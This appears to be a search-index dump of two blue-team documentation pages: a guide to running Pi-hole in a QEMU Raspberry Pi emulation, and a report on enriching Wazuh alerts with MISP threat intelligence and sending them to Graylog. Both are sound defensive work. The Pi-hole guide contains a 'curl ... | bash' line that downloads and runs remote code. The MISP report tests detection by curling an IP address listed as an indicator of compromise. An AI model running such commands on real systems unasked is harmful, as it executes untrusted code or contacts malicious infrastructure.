Team/QEMU-RaspberryPi-Simulation-Pi-hole","content":"","keywords":"","version":"Next"},{"title":"Introduction​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#introduction","content":" This report presents a comprehensive approach to configuring and testing Pi-hole, a DNS-based ad-blocking tool, using a QEMU Raspberry Pi simulation. The outlined steps aim to provide users with a structured and practical guide to successfully replicating the setup. By addressing key challenges encountered during the process, such as disk space limitations, dependency errors, and network misconfigurations, this report ensures that users can achieve a functional simulation environment. Additionally, the documentation focuses on enhancing the understanding of Pi-hole's deployment within a virtualized Raspberry Pi environment, highlighting its benefits for ad-blocking and DNS filtering. This detailed approach makes the setup accessible to users with varying levels of technical expertise, enabling a streamlined experience in deploying and utilizing Pi-hole.    ","version":"Next","tagName":"h2"},{"title":"Purpose​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#purpose","content":" This document is designed to serve as a reliable resource for setting up Pi-hole within a QEMU Raspberry Pi simulation. The primary aim is to guide users through the installation, configuration, and troubleshooting process to create a stable and functional environment. By leveraging the flexibility of QEMU, the guide eliminates the need for physical Raspberry Pi hardware, offering a cost-effective and accessible solution for ad-blocking and DNS security testing. It further addresses common issues like disk space errors, dependency conflicts, and network misconfigurations, providing effective resolutions. With an emphasis on practical application, the purpose of this report extends to equipping users with the knowledge and tools required to test Pi-hole’s capabilities and optimize it for network security.    ","version":"Next","tagName":"h2"},{"title":"Scope​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#scope","content":" Provides comprehensive instructions for setting up a QEMU Raspberry Pi simulation.Addresses critical challenges such as disk space limitations, dependency conflicts, and network misconfigurations.Guides the installation and configuration of Pi-hole for DNS-based ad-blocking.Explores the integration of curated blocklists to enhance filtering capabilities.Demonstrates testing Pi-hole’s effectiveness on various devices, including laptops and smartphones.Includes steps for troubleshooting issues like web interface accessibility and service failures.Offers practical solutions for optimizing Pi-hole’s performance and reliability.Serves as a replicable framework for users aiming to implement virtualized Pi-hole setups.Encourages broader application in cybersecurity projects and network management.Enhances understanding of virtualized environments for deploying network security tools.    ","version":"Next","tagName":"h2"},{"title":"Setup Steps​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#setup-steps","content":" ","version":"Next","tagName":"h2"},{"title":"1. Initial Setup​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#1-initial-setup","content":" Create a Working Directory Create a directory on your system to organize all necessary files and configurations related to the simulation.This directory acts as a centralized location for storing essential components like the disk image, kernel, and device tree files.Example: Create a folder named D:\\Rapi-test for this purpose. Prepare the start.bat File Purpose: This batch file contains the commands required to initialize the QEMU Raspberry Pi simulation.Steps: Open a text editor (e.g., Notepad).Write the following commands and save the file as start.bat in the working directory: qemu-system-arm ^ -kernel kernel-qemu-5.10.63-bullseye ^ -cpu arm1176 -m 256 -M versatilepb ^ -dtb versatile-pb-bullseye-5.10.63.dtb ^ -no-reboot -serial stdio ^ -append &quot;root=/dev/sda2 panic=1 rootfstype=ext4 rw&quot; ^ -hda 2024-11-13-raspios-bookworm-armhf-lite.img ^ -netdev user,id=mynet0,hostfwd=tcp::2222-:22,hostfwd=udp::53-:53,hostfwd=tcp::8090-:80 ^ -device virtio-net-pci,netdev=mynet0 Run the start.bat File Steps: Open a terminal in the directory where the start.bat file is saved.Execute the batch file by typing start.bat and pressing Enter. Verification: Ensure the QEMU virtual machine starts, and the Raspberry Pi terminal interface appears.Verify that no errors occur during initialization and that the terminal is ready for further configuration.    ","version":"Next","tagName":"h3"},{"title":"2. Resolve Disk Space Issues​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#2-resolve-disk-space-issues","content":" Issue: Login errors and crashes occurred due to limited disk space.Solution: Resize the disk image using the following command:  qemu-img.exe resize 2024-11-13-raspios-bookworm-armhf-lite.img +4G     Rerun the start.bat file to confirm the changes. QEMU was restarted, resolving the space issue.    ","version":"Next","tagName":"h3"},{"title":"3. Fix Package Dependency Errors​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#3-fix-package-dependency-errors","content":" Issue: Package dependency issues may occur during system updates or upgrades, causing interruptions in the process. Stop and Disable Conflicting Services Conflicting services, such as userconfig.service, can interfere with the package manager. Stopping and disabling these services prevents further interruptions: sudo systemctl stop userconfig.service sudo systemctl disable userconfig.service Clear Lock Files Lock files may block access to the package manager, causing errors during installation or updates. Removing these files resolves the issue: sudo rm -f /var/lib/dpkg/lock sudo rm -f /var/lib/dpkg/lock-frontend sudo rm -f /var/cache/debconf/config.dat* Reconfigure and Fix Broken Dependencies Reconfiguring pending packages and repairing broken dependencies ensures the package manager can operate correctly: sudo dpkg --configure -a sudo apt --fix-broken install Retry the Update and Upgrade After addressing the dependency issues, rerunning the update and upgrade process completes the system updates successfully: sudo apt update &amp;&amp; sudo apt upgrade -y     ","version":"Next","tagName":"h3"},{"title":"4. Manual Wi-Fi Configuration​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#4-manual-wi-fi-configuration","content":" If configuring Wi-Fi using sudo raspi-config fails, follow these manual steps:  Edit the Wi-Fi Configuration File:  sudo nano /etc/wpa_supplicant/wpa_supplicant.conf   Add the following:  country=AU ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev update_config=1 network={ ssid=&quot;Your-WiFi-Name&quot; psk=&quot;Your-WiFi-Password&quot; }     Fix and Start Networking Services:  sudo apt install dhcpcd5 -y sudo systemctl enable dhcpcd sudo systemctl start dhcpcd   Verify Connectivity:  ping google.com       ","version":"Next","tagName":"h3"},{"title":"5. Installing Pi-hole​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#5-installing-pi-hole","content":" Install Pi-hole  Use the official Pi-hole installation script to download and set up the software. This script automates the installation process and configures Pi-hole on the system:  curl -sSL https://install.pi-hole.net | bash   Follow Installation Prompts  During the installation, provide the following inputs as prompted:Network Interface: Select eth0 (Ethernet) as the network interface for Pi-hole.Static IP Address: Assign a static IP address to the device (e.g., 10.0.2.15). This ensures the Pi-hole server maintains a consistent IP for DNS operations.Upstream DNS Provider: Choose a DNS provider such as Google DNS or Cloudflare for forwarding DNS queries.Web Interface: Enable the web interface to manage and monitor Pi-hole through a browser. This interface simplifies configuration and provides real-time query logs.    ","version":"Next","tagName":"h3"},{"title":"Troubleshooting Pi-hole Web Interface Issues​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#troubleshooting-pi-hole-web-interface-issues","content":" Verify and Restart Services  Open the lighttpd configuration file:  sudo nano /etc/lighttpd/lighttpd.conf   Check for the following lines in the file. Add them if missing:  server.document-root = &quot;/var/www/html&quot; server.error-handler-404 = &quot;/pihole/index.php&quot; server.bind = &quot;0.0.0.0&quot;   Check the status of the lighttpd web server:  sudo systemctl status lighttpd   Restart the lighttpd service:  sudo systemctl restart lighttpd   Fix Permissions  Ensure the Pi-hole web directory has the correct permissions:  sudo chown -R www-data:www-data /var/www/html sudo chmod -R 755 /var/www/html   Reconfigure Pi-hole  Use the Pi-hole repair tool to fix configuration issues:  pihole -r   Select either &quot;Repair&quot; or &quot;Reconfigure&quot; as needed.    ","version":"Next","tagName":"h3"},{"title":"6. Configuring Devices for Pi-hole​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#6-configuring-devices-for-pi-hole","content":" ","version":"Next","tagName":"h3"},{"title":"1. On Your Laptop (Windows)​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#1-on-your-laptop-windows","content":" Overview: Configure your laptop to use the Pi-hole server as its DNS resolver.  Find the Pi-hole Server IP Address:​  On the Raspberry Pi command prompt (already opened), type the following command:  ifconfig     Look for the IP address associated with your network interface, such as eth0 or wlan0. For example, the IP address might be 10.0.2.15.    Steps to Configure DNS on Windows:​  Open Settings &gt; Network &amp; Internet &gt; Properties.Navigate to DNS Server Assignment.Select &quot;Manual&quot; and input the following DNS addresses: Primary DNS: The IP address of the Pi-hole server, e.g., 10.0.2.15.Secondary DNS: A fallback DNS, e.g., 8.8.8.8 (Google DNS). Save the settings and restart the network adapter to apply the changes.  ","version":"Next","tagName":"h3"},{"title":"2. On Your Android Phone​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#2-on-your-android-phone","content":" Overview: Configure your phone's Wi-Fi settings to route DNS queries through the Pi-hole server.  Find the Host System's IP Address:​  On your Windows host system (not the Raspberry Pi), open Command Prompt.Type the following command:  ipconfig     Look for the IPv4 Address under the active network connection. For example, the IP address might be 10.0.0.145.    Steps to Configure DNS on Android:​  Go to Wi-Fi Settings and select the connected network. Tap Modify Network and set the IP configuration to Static. Enter the DNS addresses: DNS 1: The Pi-hole server's IP address, e.g., 10.0.0.145.DNS 2: A fallback DNS, e.g., 8.8.8.8. Save the changes.    ","version":"Next","tagName":"h3"},{"title":"3. Access the Pi-hole Admin Interface:​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#3-access-the-pi-hole-admin-interface","content":" Use a web browser to access the Pi-hole dashboard for monitoring and configuration: From your laptop: Navigate to http://10.0.2.15/admin.    From your phone: Navigate to http://10.0.0.145:8090/admin. The dashboard provides tools to view real-time DNS queries, blocklists, and system status.    ","version":"Next","tagName":"h3"},{"title":"7. Test Ad-blocking on Websites​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#7-test-ad-blocking-on-websites","content":" Open ad-heavy websites such as cnn.com or forbes.com on any connected device to evaluate Pi-hole’s performance.Navigate to the Pi-hole admin interface and check the query logs for blocked domains. This confirms that Pi-hole is successfully filtering ads and processing DNS requests.  ","version":"Next","tagName":"h3"},{"title":"1. Verify DNS Resolution​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#1-verify-dns-resolution","content":" Test if Pi-hole is correctly resolving DNS queries by using the following commands: dig google.com @127.0.0.1 nslookup google.com 127.0.0.1 These commands query the local Pi-hole server (127.0.0.1) to ensure DNS requests are being processed.    ","version":"Next","tagName":"h3"},{"title":"Additional Resources​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#additional-resources","content":" Video Guidance: Click here to watch the video tutorial. Full Step-by-Step Document: Click here to view the detailed document.    ","version":"Next","tagName":"h2"},{"title":"Conclusion​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#conclusion","content":" By following these steps, a comprehensive and reliable setup for the QEMU Raspberry Pi simulation with Pi-hole can be achieved. This process addresses common challenges such as disk space limitations, dependency errors, and network configuration issues, ensuring a seamless installation and operation. With Pi-hole successfully configured, users can enhance their network security and enjoy robust ad-blocking across multiple devices, creating a more efficient and secure browsing experience.    ","version":"Next","tagName":"h2"},{"title":"References​","type":1,"pageTitle":"QEMU Raspberry Pi Simulation with Pi-hole","url":"/redback-documentation/docs/cybersecurity/Blue Team/QEMU-RaspberryPi-Simulation-Pi-hole#references","content":" Raspberry Pi Foundation (2024). Pi-hole and DNS Security Setup Documentation. Available at: https://www.raspberrypi.org/documentation/ (Accessed: 24 November 2024).QEMU Team (2024). QEMU Documentation. Available at: https://www.qemu.org/docs/ (Accessed: 24 November 2024).CyberSec Research Lab (2024). Enhancing Network Security through DNS. Available at: https://cyberseclab.org/dns-security (Accessed: 24 November 2024).Tech with Tim (2024). QEMU Raspberry Pi Setup and Testing. Available at: https://youtu.be/cE21YjuaB6o?si=8vUHWSPezyhhIGxN (Accessed: 24 November 2024).Firebog (2024). Blocklists for Pi-hole. Available at: https://firebog.net/ (Accessed: 24 November 2024). ","version":"Next","tagName":"h2"},{"title":"Report on Integrating MISP with Wazuh and Graylog","type":0,"sectionRef":"#","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/","content":"","keywords":"","version":"Next"},{"title":"1. Executive Summary​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#1-executive-summary","content":" This report documents the current status, configuration, and technical progress made in integrating MISP (Malware Information Sharing Platform) with Wazuh and Graylog. The integration aims to enrich Wazuh alerts using threat intelligence from MISP, enabling faster detection of Indicators of Compromise (IoCs). This stack also leverages Graylog to enhance log visualization, normalization, and long-term storage. This integration was demonstrated on Ubuntu 22.04 local VM, and windows 10 PC.    ","version":"Next","tagName":"h2"},{"title":"2. Integration Architecture Overview​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#2-integration-architecture-overview","content":" The below architecture illustrates how Sysmon event data is collected, enriched with threat intelligence from MISP, and forwarded to Graylog for visualization:  Sysmon Events are generated on monitored endpoints (Windows or Linux). These events are captured by the Wazuh Agent, which writes them to the alerts.json log file. Fluent Bit reads alerts.json and forwards the logs to both: Graylog – for dashboarding and search,Wazuh Manager – for rule-based processing. The Wazuh Manager applies custom rules to detect specific event types (e.g., DNS queries, network connections). If a rule matches, it triggers the custom-misp.py script, which: Extracts relevant indicators (e.g., domains, IPs),Sends an API query to MISP to check for known threats. If MISP returns a positive hit, the script enriches the alert. The enriched alert is then forwarded by Fluent Bit to Graylog for final visualization and analysis, these alerts are also seen on Wazuh dashboard.  Diagram 1.0 showing the integration schematics    ","version":"Next","tagName":"h2"},{"title":"3. Tools and Components​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#3-tools-and-components","content":" Component\tPurpose\tCurrent StatusWazuh Manager\tAnalyzes endpoint logs and triggers integration events\tInstalled and working Wazuh Agent\tCaptures logs (Sysmon on Windows, and Linux)\tActive and reporting MISP (Docker)\tCentralized threat intel sharing platform\tSuccessfully deployed Graylog\tLog normalization, indexing, and visual analysis\tIntegrated and operational custom-misp.py\tScript for querying MISP and enriching alerts\tOperational and enhanced  Why These Tools:  Wazuh's flexibility supports fine-grained custom rule logic needed for real-time IoC correlation.Dockerized MISP setup simplifies portability and version control for team replication.Graylog enables full text search and enrichment pipelines crucial for alert triage and investigation.    ","version":"Next","tagName":"h2"},{"title":"4. Configuration & Implementation Steps​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#4-configuration--implementation-steps","content":" ","version":"Next","tagName":"h2"},{"title":"4.1 Wazuh Agent & Manager Setup​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#41-wazuh-agent--manager-setup","content":" Wazuh agent plays a central role in the Wazuh security monitoring platform. It is installed on endpoints (servers, desktops, cloud instances, containers, etc.) and acts as the data collection component for host-based intrusion detection and system monitoring. Wazuh manager acts as the central processing point for Sysmon events and executes MISP enrichment.Steps taken:  Installed Wazuh agent on both windows and linux endpoints and confirmed operational statusConfirmed receipt of Sysmon logs from Windows and linux agents using sysmonforlinux at the linux endpoint.Enabled JSON alert format for integration (required for MISP script parsing)Enabled password-based agent authentication for secure connectivity    Snip 1.0 showing Wazuh agent running successfully of Windows endpoint    Snip 1.1 showing Wazuh agent running successfuly on Linux endpoint  Snip 1.2 showing sysmon for linux status on the linux endpoint    Snip 1.3 showing logs generated through sysmon for linux, these logs are parsed to the Wazuh manager through the Wazuh-agent    Snip 1.4 demonstrating the generation of symon logs on linux endpoint    Snip 1.5 showing status of both endpoint agents on Wazuh dashboard    Snip 1.6 showing Wazuh-alert logs from Linux and windows endpoints captured on Wazuh dashboard  ","version":"Next","tagName":"h3"},{"title":"4.2 MISP Operation​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#42-misp-operation","content":" Without MISP being operationally ready and accessible by Wazuh, Wazuh would be unable to query or retrieve meaningful intelligence.Steps taken:  Confirmed MISP server operational statusCreated admin user and verified API key for secure script accessTested access to threat feed events and attribute searches    Snip 1.7 showing Container log of successful MISP-docker startup    Snip 1.8 showing creation of MISP API key    Snip 1.9 showing sample threat feeds available on MISP  ","version":"Next","tagName":"h3"},{"title":"4.3 Graylog Integration​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#43-graylog-integration","content":" Graylog was deployed to view the raw and structured form of the alert before enrichment, essential for visibility, troubleshooting, and archival, but to also create alerts on enriched logs that include MISP data.Steps taken:  Configured Fluent Bit to tail alerts.json on Wazuh ManagerSet up TCP Raw Input on Graylog (port 5555)Modified /etc/fluent-bit/fluent-bit.conf to match Wazuh alert sourceConfigured Graylog extractors to parse enriched fields  Snip 2.0 showing fluent-bit configured to tail Wazuh  Full config file below:  [SERVICE] Flush 5 Daemon Off Log_Level info Parsers_File parsers.conf Plugins_File plugins.conf HTTP_Server Off HTTP_Listen 0.0.0.0 HTTP_Port 2020 Storage.metrics On Storage.path /var/log/fib-storage/ Storage.sync normal Storage.checksum off Storage.backlog.mem_limit 5M Log_File /var/log/td-agent-bit.log [INPUT] Name tail Tag wazuh Path /var/ossec/logs/alerts/alerts.json Parser json Buffer_Max_Size 5MB Buffer_Chunk_Size 400k Storage.type filesystem Mem_Buf_Limit 512MB [OUTPUT] Name tcp Match wazuh Host 192.168.56.109 Port 5555 Format json_lines net.keepalive off json_date_key true     Snip 2.1 showing graylog input setup  Snip 2.2 showing input alerts on graylog    ","version":"Next","tagName":"h3"},{"title":"4.4 MISP Integration Script​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#44-misp-integration-script","content":" MISP automates threat correlation and return MISP intelligence for further action.  Location: /var/ossec/integrations/custom-misp.pyEnhanced to support NDJSON format for batch processing (performance and compatibility improvement)Sends enriched output back via Wazuh socketUses regex and conditionals to match Event ID types (e.g., Sysmon Event 1, 3, 22)  Click here to view custom-misp.py employed  The below Integration block added to configuration file /var/ossec/etc/ossec.conf and the Wazuh manager restarted afterwards. This triggers the custom-misp.py script for the select sysmon groups.  &lt;integration&gt; &lt;name&gt;custom-misp.py&lt;/name&gt; &lt;group&gt;sysmon_event1,sysmon_event_22,syscheck&lt;/group&gt; &lt;alert_format&gt;json&lt;/alert_format&gt; &lt;/integration&gt;   ","version":"Next","tagName":"h3"},{"title":"4.5 Rule and Decoder Configuration​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#45-rule-and-decoder-configuration","content":" Why: To classify alerts enriched by MISP and assign appropriate severity levels.  Loaded misp.xml with custom rules (e.g., rule ID 100622)Verified integration group contains correct Sysmon events  Snip 2.3 showing MISP.xml custom rule applied on Wazuh  &lt;group name=&quot;misp,&quot;&gt; &lt;!-- Base MISP Integration --&gt; &lt;rule id=&quot;100620&quot; level=&quot;10&quot;&gt; &lt;field name=&quot;integration&quot;&gt;misp&lt;/field&gt; &lt;match&gt;misp&lt;/match&gt; &lt;description&gt;MISP Events&lt;/description&gt; &lt;options&gt;no_full_log&lt;/options&gt; &lt;/rule&gt; &lt;!-- Error Connecting to MISP --&gt; &lt;rule id=&quot;100621&quot; level=&quot;5&quot;&gt; &lt;if_sid&gt;100620&lt;/if_sid&gt; &lt;field name=&quot;misp.error&quot;&gt;\\.+&lt;/field&gt; &lt;description&gt;MISP - Error connecting to API&lt;/description&gt; &lt;options&gt;no_full_log&lt;/options&gt; &lt;group&gt;misp_error,&lt;/group&gt; &lt;/rule&gt; &lt;!-- MISP Hit - General --&gt; &lt;rule id=&quot;100622&quot; level=&quot;12&quot;&gt; &lt;field name=&quot;misp.category&quot;&gt;\\.+&lt;/field&gt; &lt;description&gt;MISP - IoC found: Category: $(misp.category), Value: $(misp.value)&lt;/description&gt; &lt;options&gt;no_full_log&lt;/options&gt; &lt;group&gt;misp_alert,&lt;/group&gt; &lt;/rule&gt; &lt;!-- MISP Hit - High Threat Level (1 = high in MISP) --&gt; &lt;rule id=&quot;100623&quot; level=&quot;15&quot;&gt; &lt;if_sid&gt;100620&lt;/if_sid&gt; &lt;field name=&quot;misp.threat_level_id&quot;&gt;1&lt;/field&gt; &lt;description&gt;MISP - HIGH Threat Level IoC Detected: Value $(misp.value)&lt;/description&gt; &lt;group&gt;misp_alert,&lt;/group&gt; &lt;/rule&gt; &lt;!-- MISP Hit - Trusted Partner (e.g., CERT-AU, adjust name as needed) --&gt; &lt;rule id=&quot;100624&quot; level=&quot;13&quot;&gt; &lt;if_sid&gt;100620&lt;/if_sid&gt; &lt;field name=&quot;misp.orgc&quot;&gt;ESET&lt;/field&gt; &lt;description&gt;MISP - Trusted Source Alert from ESET: Value $(misp.value)&lt;/description&gt; &lt;group&gt;misp_alert,&lt;/group&gt; &lt;/rule&gt; &lt;/group&gt;   ","version":"Next","tagName":"h3"},{"title":"4.6 Windows Endpoint Testing - Live IOC Validation​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#46-windows-endpoint-testing---live-ioc-validation","content":" This section documents the successful validation of the MISP-Wazuh integration from a Windows endpoint using Sysmon-generated DNS requests.  Test Domain Used:​  Domain: www.iabg.deMISP Source: Confirmed attribute listed in MISP (added via event import)Trigger Method: Executed ping www.iabg.de from the Windows terminalSysmon Event Triggered: Event ID 22 – DNS Request  Steps Followed:​  Sysmon was running and actively monitoring DNS events on the Windows endpoint.ping www.iabg.de was issued in the Windows command prompt.Sysmon generated an Event ID 22, capturing the DNS request.Wazuh agent forwarded the event to Wazuh Manager.custom-misp.py processed the event, extracted the domain, and queried MISP.MISP returned a positive match for www.iabg.de.An enriched alert with metadata from MISP was generated and displayed in: Wazuh DashboardGraylog, with full JSON structure parsed.  Snip 2.4 showing sysmon generated event (ping - DNS request) of potential IoC available in MISP    Snip 2.5 Log of API request and Hit to and fro MISP    Snip 2.6 showing JSON enriched alert from MISP  ","version":"Next","tagName":"h3"},{"title":"4.7 Linux Endpoint Testing - Live IOC Validation​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#47-linux-endpoint-testing---live-ioc-validation","content":" To validate the full integration flow on Linux (Sysmon for Linux → Wazuh Agent → Wazuh Manager → MISP → Enriched Alert), a real IP address from MISP was selected for testing.  Test Domain/IP Used:​  Value: 178.128.103.24MISP Source: Domain/IP from ESET - Network Activity (visible in MISP Attributes UI)Trigger Method: Executed curl 178.128.103.24 from the Linux terminalSysmon Event Triggered: Event ID 3 – Network Connection Initiated  Steps Followed:​  Verified that Sysmon for Linux is running on the endpoint. Issued: curl 178.128.103.24 to simulate outbound IOC interaction. Confirmed via logs that Sysmon recorded the network connection (Event ID 3). Wazuh agent forwarded logs to Wazuh Manager in JSON format. Wazuh triggered custom-misp.py, which queried MISP and received a positive hit for the IP. Alert enriched with MISP fields appeared on Wazuh Dashboard and Graylog.  Snip 2.7 MISP Attribute page showing '178.128.103.24`  Snip 2.8 showing Terminal command output from Linux curl test  Snip 2.9 showing Wazuh dashboard alert with enriched alert from MISP  Snip 3.0 showing Graylog parsed alert with enriched MISP data    ","version":"Next","tagName":"h3"},{"title":"5. Reflection​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#5-reflection","content":" ","version":"Next","tagName":"h2"},{"title":"Appendix: Wazuh vs. Graylog for Threat Intelligence Enrichment​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#appendix-wazuh-vs-graylog-for-threat-intelligence-enrichment","content":" When deciding between Wazuh and Graylog for integrating threat intelligence (such as from MISP), it's important to evaluate what each tool provides and whether one can replace the other based on your operational goals.  ","version":"Next","tagName":"h3"},{"title":"What Graylog Can Do on Its Own​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#what-graylog-can-do-on-its-own","content":" Ingest logs from multiple sources (via Fluent Bit, Filebeat, Syslog, etc.)Apply pipeline rules, extractors, and lookup tables to enrich logs in real timePerform direct REST API lookups (e.g., to MISP or AbuseIPDB)Store and search logs using OpenSearchVisualize enriched logs using dashboardsTrigger alerts, notifications, and events  Graylog alone is capable of:  Parsing Wazuh logsEnriching alerts with MISP using Lookup TablesGenerating dashboards and correlation alerts    ","version":"Next","tagName":"h3"},{"title":"What Wazuh Adds on Top​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#what-wazuh-adds-on-top","content":" Feature\tWhy It MattersEndpoint-focused HIDS\tDetects file changes, rootkits, unauthorized processes, and more Prebuilt rule engine\tMaps Sysmon events, compliance checks, and threat matches to actions Agent-based collection\tMonitors system integrity and forwards logs in enriched JSON Built-in compliance\tIncludes modules for CIS, PCI-DSS, NIST, etc. Inline enrichment\tEnriches logs (via MISP) before they reach Graylog Resilience\tOperates independently even if SIEM is down    ","version":"Next","tagName":"h3"},{"title":"When to Use Each​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#when-to-use-each","content":" Scenario\tUse Wazuh\tUse GraylogYou only need log ingestion and enrichment\tNot Required\tRecommended You want endpoint-based intrusion detection\tRecommended\tNot Applicable You require compliance reports (CIS/PCI)\tRecommended\tNot Applicable You want to enrich alerts before forwarding to SIEM\tOptional\tSupported You're building a full-stack detection + observability pipeline\tRecommended\tRecommended  ","version":"Next","tagName":"h3"},{"title":"Summary​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#summary","content":" If you're only concerned with ingesting logs and enriching them with MISP, Graylog alone is sufficient. However, if you need detection at the host level, inline enrichment, or agent-based file/process monitoring, then Wazuh adds significant value.  Together, Wazuh + Graylog + MISP create a powerful, end-to-end detection and response platform.  ","version":"Next","tagName":"h3"},{"title":"6. Conclusion​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#6-conclusion","content":" The successful integration of MISP with Wazuh and Graylog demonstrates a fully functional, open-source threat detection and enrichment pipeline. The project achieved the following milestones:  Real-time ingestion of endpoint activity using Wazuh agents on both Windows and Linux.Threat enrichment via custom Python script that interacts with the MISP API using live Indicators of Compromise (IoCs).End-to-end validation of alerts, including Sysmon Event ID 22 (DNS request) from Windows and Event ID 3 (network connection) from Linux.Alert enrichment visible on both Wazuh Dashboard and Graylog, enabling immediate threat triage.Comparative analysis of Wazuh vs. Graylog for enrichment workflows.  This implementation provides scalable and reproducible foundations for modern SOC operations. Wazuh strengthens host-level monitoring and compliance, while Graylog extends visualization and alerting. MISP, as the intelligence backbone, completes the proactive detection loop.    ","version":"Next","tagName":"h2"},{"title":"7. References​","type":1,"pageTitle":"Report on Integrating MISP with Wazuh and Graylog","url":"/redback-documentation/docs/cybersecurity/Blue Team/Wazuh - MISP Integration/#7-references","content":" Wazuh Documentation. (2024). Installation and configuration guides. https://documentation.wazuh.comMISP Project. (2024). MISP threat intelligence platform. https://www.misp-project.org/SOCFortress. (2024). Installing the New Wazuh version 4.4 — The SOCFortress Way. [Medium Article]SOCFortress. (2024). Part 1–3: Wazuh Indexer, Manager, and Graylog Integration Guides. [Medium Series]OpenSecure. (2024). Wazuh and MISP Integration via API. [Medium]Sysinternals. (2024). Sysmon Documentation by Microsoft. 